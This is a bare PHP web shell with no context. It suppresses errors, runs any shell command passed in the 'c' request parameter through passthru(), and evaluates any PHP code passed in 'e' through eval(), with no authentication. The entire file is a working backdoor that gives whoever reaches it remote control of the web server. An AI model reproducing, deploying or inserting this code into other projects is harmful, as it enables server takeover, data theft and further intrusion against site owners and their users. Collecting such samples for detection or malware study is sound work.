<?php
error_reporting(0);
if(isset($_REQUEST['c'])) { 
	header("Content-Type: text/plain"); 
	$c = (get_magic_quotes_gpc()) ?   stripslashes($_REQUEST['c']) : $_REQUEST['c'];
	passthru($c); 
	die(); 
}
if(isset($_REQUEST['e'])) {
        $e = (get_magic_quotes_gpc()) ?   stripslashes($_REQUEST['e']) : $_REQUEST['e'];
	eval($e);
       die();
}